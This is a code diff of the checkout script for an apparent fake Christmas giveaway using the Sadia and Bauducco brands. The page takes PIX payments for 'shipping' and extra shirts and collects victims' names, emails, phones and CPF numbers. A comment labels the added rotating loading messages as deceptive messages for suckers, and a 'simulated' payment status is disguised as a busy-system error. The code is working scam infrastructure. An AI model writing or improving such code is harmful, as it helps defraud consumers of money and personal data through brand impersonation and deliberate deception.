@@ -50,11 +50,11 @@ function setupCheckout() {
   let extrasCount = 0
   const extrasUnit = 24.99
   let brindeModel = 'camisa1'
-  const subtotal = 0 // PRODUTO É GRÁTIS
+  const subtotal = 0
 
   function updateTotals() {
     const extras = extrasCount * extrasUnit
-    const total = subtotal + shipping + extras // Só frete + extras
+    const total = subtotal + shipping + extras
     
     if (subtotalEl) subtotalEl.textContent = formatCurrencyBRL(subtotal)
     if (shippingEl) shippingEl.textContent = formatCurrencyBRL(shipping)
@@ -251,116 +251,138 @@ function setupCheckout() {
     })
   }
 
- if (confirmBtn) {
+  if (confirmBtn) {
     confirmBtn.addEventListener('click', async () => {
-        if (!validateCheckout()) {
-            alert('Preencha todos os campos corretamente!')
-            return
+      if (!validateCheckout()) {
+        alert('Preencha todos os campos corretamente!')
+        return
+      }
+
+      if (confirmBtn.disabled) return
+
+      const shippingCode = selectedShippingCode || 'correios'
+      const shippingCents = shippingCode === 'jadlog' ? 3499 : 3799
+      const extrasCents = Math.round(extrasCount * 24.99 * 100)
+      const amountCents = shippingCents + extrasCents
+
+      const phoneDigits = onlyDigits(phone ? phone.value : '')
+      const cpfDigits = onlyDigits(cpf ? cpf.value : '')
+
+      const items = [
+        { 
+          title: 'Kit Natalino Sadia x Bauducco', 
+          unitPrice: 0,
+          quantity: 1, 
+          tangible: true, 
+          externalRef: 'kit_natal_gratis' 
+        },
+        { 
+          title: shippingCode === 'jadlog' ? 'Frete Jadlog' : 'Frete Correios', 
+          unitPrice: shippingCents, 
+          quantity: 1, 
+          tangible: false, 
+          externalRef: shippingCode 
         }
+      ]
 
-        if (confirmBtn.disabled) return
+      items.push({ 
+        title: `Camiseta G (${brindeModel}) - Brinde`, 
+        unitPrice: 0,
+        quantity: 1, 
+        tangible: true, 
+        externalRef: 'camisa_brinde' 
+      })
 
-        const shippingCode = selectedShippingCode || 'correios'
-        const shippingCents = shippingCode === 'jadlog' ? 3499 : 3799
-        const extrasCents = Math.round(extrasCount * 24.99 * 100)
-        
-        // CORREÇÃO: DECLARA amountCents FORA DO TRY
-        const amountCents = shippingCents + extrasCents
-
-        const phoneDigits = onlyDigits(phone ? phone.value : '')
-        const cpfDigits = onlyDigits(cpf ? cpf.value : '')
-
-        const items = [
-            { 
-                title: 'Kit Natalino Sadia x Bauducco', 
-                unitPrice: 0,
-                quantity: 1, 
-                tangible: true, 
-                externalRef: 'kit_natal_gratis' 
-            },
-            { 
-                title: shippingCode === 'jadlog' ? 'Frete Jadlog' : 'Frete Correios', 
-                unitPrice: shippingCents, 
-                quantity: 1, 
-                tangible: false, 
-                externalRef: shippingCode 
-            }
-        ]
-
+      if (extrasCents > 0 && extrasCount > 0) {
         items.push({ 
-            title: `Camiseta G (${brindeModel}) - Brinde`, 
-            unitPrice: 0,
-            quantity: 1, 
-            tangible: true, 
-            externalRef: 'camisa_brinde' 
+          title: 'Camiseta adicional G', 
+          unitPrice: 2499,
+          quantity: extrasCount, 
+          tangible: true, 
+          external_ref: 'camisa_extra' 
+        })
+      }
+
+      const body = {
+        amount: amountCents,
+        currency: 'BRL',
+        paymentMethod: 'pix',
+        pix: { expiresInDays: 1 },
+        items: items,
+        customer: { 
+          name: fullName ? fullName.value.trim() : '', 
+          email: email ? email.value.trim() : '', 
+          phone: phoneDigits, 
+          document: { number: cpfDigits, type: 'cpf' } 
+        }
+      }
+
+      // MENSAGENS ENGANOSAS PRA OTÁRIOS
+      const loadingMessages = [
+        "Processando seu pedido...",
+        "Gerando código PIX...", 
+        "Quase lá...",
+        "Preparando tudo...",
+        "Só um momento...",
+        "Finalizando...",
+        "Muitos pedidos, aguarde..."
+      ]
+      
+      let messageIndex = 0
+      const loadingInterval = setInterval(() => {
+        confirmBtn.textContent = loadingMessages[messageIndex]
+        messageIndex = (messageIndex + 1) % loadingMessages.length
+      }, 2000)
+      
+      confirmBtn.disabled = true
+      confirmBtn.textContent = loadingMessages[0]
+
+      try {
+        const res = await fetch(`${API_BASE}api/transactions`, {
+          method: 'POST', 
+          headers: { 'Content-Type': 'application/json' }, 
+          body: JSON.stringify(body)
         })
 
-        if (extrasCents > 0 && extrasCount > 0) {
-            items.push({ 
-                title: 'Camiseta adicional G', 
-                unitPrice: 2499,
-                quantity: extrasCount, 
-                tangible: true, 
-                external_ref: 'camisa_extra' 
-            })
+        clearInterval(loadingInterval)
+
+        if (!res.ok) {
+          const errorData = await res.json().catch(() => ({}))
+          throw new Error(errorData.error || errorData.message || `Erro ${res.status}`)
         }
 
-        const body = {
-            amount: amountCents,
-            currency: 'BRL',
-            paymentMethod: 'pix',
-            pix: { expiresInDays: 1 },
-            items: items,
-            customer: { 
-                name: fullName ? fullName.value.trim() : '', 
-                email: email ? email.value.trim() : '', 
-                phone: phoneDigits, 
-                document: { number: cpfDigits, type: 'cpf' } 
-            }
+        const data = await res.json()
+        
+        // VERIFICA SE É PIX SIMULADO
+        if (data.status === "simulated_due_to_timeout") {
+          throw new Error("Sistema ocupado. Tente novamente em instantes.")
+        }
+        
+        const amountBRL = amountCents / 100
+        if (pixAmountEl) pixAmountEl.textContent = formatCurrencyBRL(amountBRL)
+        
+        const code = data.pix?.qrcode || ''
+        if (pixCode) pixCode.textContent = code
+        
+        if (pixQr) {
+          pixQr.src = `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(code)}`
+        }
+        
+        if (pixInfo) {
+          pixInfo.style.display = ''
+          pixInfo.scrollIntoView({ behavior: 'smooth' })
         }
 
-        confirmBtn.disabled = true
-        confirmBtn.textContent = 'Processando...'
-
-        try {
-            const res = await fetch(`${API_BASE}api/transactions`, {
-                method: 'POST', 
-                headers: { 'Content-Type': 'application/json' }, 
-                body: JSON.stringify(body)
-            })
-
-            if (!res.ok) {
-                const errorData = await res.json().catch(() => ({}))
-                throw new Error(errorData.error || errorData.message || `Erro ${res.status}`)
-            }
-
-            const data = await res.json()
-            
-            // CORREÇÃO: amountBRL usa amountCents que já está definido
-            const amountBRL = amountCents / 100
-            if (pixAmountEl) pixAmountEl.textContent = formatCurrencyBRL(amountBRL)
-            
-            const code = data.pix?.qrcode || ''
-            if (pixCode) pixCode.textContent = code
-            
-            if (pixQr) {
-                pixQr.src = `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(code)}`
-            }
-            
-            if (pixInfo) {
-                pixInfo.style.display = ''
-                pixInfo.scrollIntoView({ behavior: 'smooth' })
-            }
-
-        } catch (error) {
-            console.error('Erro no pagamento:', error)
-            alert(`Erro ao processar pagamento: ${error.message}`)
-        } finally {
-            confirmBtn.disabled = false
-            confirmBtn.textContent = 'Pagar e confirmar envio'
-        }
+      } catch (error) {
+        clearInterval(loadingInterval)
+        console.error('Erro no pagamento:', error)
+        alert(`Ops! ${error.message}`)
+      } finally {
+        confirmBtn.disabled = false
+        confirmBtn.textContent = 'Pagar e confirmar envio'
+      }
     })
-}
+  }
 
   history.pushState({ k: 'checkout' }, '')
   window.addEventListener('popstate', () => { 
